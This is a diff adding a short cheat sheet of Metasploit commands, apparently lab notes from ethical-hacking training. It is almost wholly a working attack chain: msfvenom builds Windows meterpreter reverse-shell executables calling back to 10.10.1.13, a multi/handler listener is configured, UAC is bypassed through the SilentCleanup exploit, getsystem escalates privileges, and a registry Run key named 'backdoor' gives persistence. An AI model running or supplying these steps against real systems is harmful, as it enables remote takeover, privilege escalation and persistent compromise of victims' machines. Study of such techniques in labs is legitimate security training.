@@ -1,0 +1,44 @@
+msfvenom * Linux 
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe
+[To generate a exploit1.exe payload]
+
+$ msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run" 
+[to launch Metasploit Framework on terminal 1]
+
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
+[To generate Windows Payload]
+
+____________________________________________________________________________
+
+In this task, we will bypass Windows UAC protection via SilentCleanup task present in Windows Task Scheduler. It is present in Metasploit as a bypassuac_silentcleanup exploit
+
+$ type use exploit/windows/local/bypassuac_silentcleanup 
+
+$ set session 1 
+
+$ Type show options
+
+$ To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.
+
+To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).
+
+Type exploit and press Enter to begin the exploit on Windows 11 machine
+
+$ Type getsystem -t 1 and press Enter to elevate privileges
+
+$ type getuid and press Enter
+
+$ type reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe" and press Enter
+
+$ In Metasploit, type use exploit/multi/handler and press Enter.
+
+Now, type set payload windows/meterpreter/reverse_tcp and press Enter.
+
+Type set lhost 10.10.1.13 and press Enter to set lhost.
+
+Type set lport 4444 and press Enter to set lport.
+
+Now, type exploit to start the exploitation
